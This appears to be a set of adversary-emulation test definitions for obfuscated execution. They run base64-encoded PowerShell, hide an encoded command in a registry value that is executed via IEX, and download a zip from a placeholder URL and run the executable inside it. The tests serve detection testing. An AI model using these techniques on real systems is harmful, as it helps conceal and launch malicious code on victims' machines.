Atomic Test #1 - Execute base64-encoded PowerShell

Attack Commands: Run with powershell!
$OriginalCommand = '#{powershell_command}'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand
powershell.exe -EncodedCommand $EncodedCommand

Atomic Test #2 - Execute base64-encoded PowerShell from Windows Registry

Attack Commands: Run with powershell!
$OriginalCommand = '#{powershell_command}'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand

Set-ItemProperty -Force -Path #{registry_key_storage} -Name #{registry_entry_storage} -Value $EncodedCommand
powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} #{registry_entry_storage}).#{registry_entry_storage})))"

Cleanup Commands:
Remove-ItemProperty -Force -ErrorAction Ignore -Path #{registry_key_storage} -Name #{registry_entry_storage}


Atomic Test #3 - Execution from Compressed File

Attack Commands: Run with command_prompt!
"%temp%\temp_T1027.zip\T1027.exe"

Cleanup Commands:
taskkill /f /im calculator.exe >nul 2>nul
rmdir /S /Q %temp%\temp_T1027.zip >nul 2>nul
del /Q "%temp%\T1027.zip" >nul 2>nul

Dependencies: Run with powershell!
Description: T1027.exe must exist on disk at $env:temp\temp_T1027.zip\T1027.exe

Check Prereq Commands:
if (Test-Path $env:temp\temp_T1027.zip\T1027.exe) {exit 0} else {exit 1}

Get Prereq Commands:
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest "#{url_path}" -OutFile "$env:temp\T1027.zip"
Expand-Archive -path "$env:temp\T1027.zip" -DestinationPath "$env:temp\temp_T1027.zip\" -Force
